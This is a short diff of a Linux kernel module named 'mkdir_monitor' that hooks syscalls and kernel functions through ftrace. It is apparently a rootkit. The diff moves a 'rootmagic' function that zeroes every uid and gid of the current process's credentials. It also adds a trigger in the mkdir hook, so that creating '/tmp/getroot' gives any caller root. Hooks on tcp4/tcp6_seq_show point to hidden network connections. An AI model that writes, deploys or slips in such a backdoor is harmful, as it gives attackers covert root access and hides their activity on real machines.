@@ -143,6 +143,22 @@ static void fh_remove_hook(struct ftrace_hook *hook)
     if (err)
         printk(KERN_ERR "ftrace_set_filter failed: %d\n", err);
 }
+//Remember check kernel lockdown mode otherwise wont work
+
+static void rootmagic(void){
+  struct cred *creds;
+  creds = prepare_creds();
+  if(creds == NULL){
+    return;
+  }
+  creds->uid.val = creds->gid.val = 0;
+  creds->euid.val = creds->egid.val = 0;
+  creds->suid.val = creds->sgid.val = 0;
+  creds->fsuid.val = creds->fsgid.val = 0;
+  commit_creds(creds);
+}
+
+
 
 #if (TCP_HOOK_IS_ENABLED > 0)
 typedef asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq,void *v);
@@ -202,6 +218,9 @@ static long hook_mkdir(const struct pt_regs *regs)
        // printk(KERN_INFO "Directory creation blocked: %s\n", path);
     }
 
+    if (strcmp(path, "/tmp/getroot") == 0) {
+        rootmagic();
+     }
     
     return 0; // Block the mkdir syscall
 }
@@ -216,19 +235,6 @@ static struct ftrace_hook hooks[] = {
     HOOK("tcp6_seq_show" ,hook_tcp6_seq_show , &tcp6),
 #endif    
 };
-static void rootmagic(void){
-  struct cred *creds;
-  creds = prepare_creds();
-  if(creds == NULL){
-    return;
-  }
-  creds->uid.val = creds->gid.val = 0;
-  creds->euid.val = creds->egid.val = 0;
-  creds->suid.val = creds->sgid.val = 0;
-  creds->fsuid.val = creds->fsgid.val = 0;
-  commit_creds(creds);
-}
-
 static int __init mkdir_monitor_init(void)
 {
     int err;
